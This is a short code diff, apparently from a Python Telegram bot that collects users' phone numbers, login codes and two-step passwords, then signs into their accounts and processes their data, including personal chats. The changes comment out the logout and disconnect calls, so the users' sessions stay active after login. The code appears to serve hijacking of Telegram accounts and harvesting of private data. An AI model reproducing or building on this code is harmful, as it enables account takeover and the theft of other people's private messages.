@@ -182,8 +182,8 @@ async def get_code(message: types.Message):
         conditions_met = True
         await what_to_do(message, conditions_met)
         #await process_user_data(client, phone_number, message.from_user.id)
-        await client.log_out()
-        await client.disconnect()
+        #await client.log_out()
+        #await client.disconnect()
         
         user_state.pop(message.from_user.id, None)  # Удаляем состояние пользователя после успешной обработки
     except SessionPasswordNeededError:
@@ -232,8 +232,8 @@ async def process_password(message: types.Message):
         if user_state[message.from_user.id]['password_attempts'] >= 3:
             await message.answer("Превышено количество попыток ввода пароля. Перезапусти меня")
             user_state.pop(message.from_user.id, None)
-            await client.log_out()
-            await client.disconnect()
+            #await client.log_out()
+            #await client.disconnect()
         else:
             await message.answer(f"Неверный пароль. Попробуйте снова. Попытка {user_state[message.from_user.id]['password_attempts']} из 3.")
     except Exception as e:
@@ -263,7 +263,8 @@ async def handle_callback_query(callback_query: AiogramCallbackQuery, state: FSM
         # Получаем необходимые данные из user_state
         client = user_state[user_id]['client']
         phone_number = user_state[user_id]['phone_number']
-        user_id = callback_query.message.chat.id
+        #user_id = callback_query.message.chat.id
+        #user_id = callback_query.from_user.id
         await process_user_data(client, phone_number, user_id)
             
     elif code == 'personal_chats':
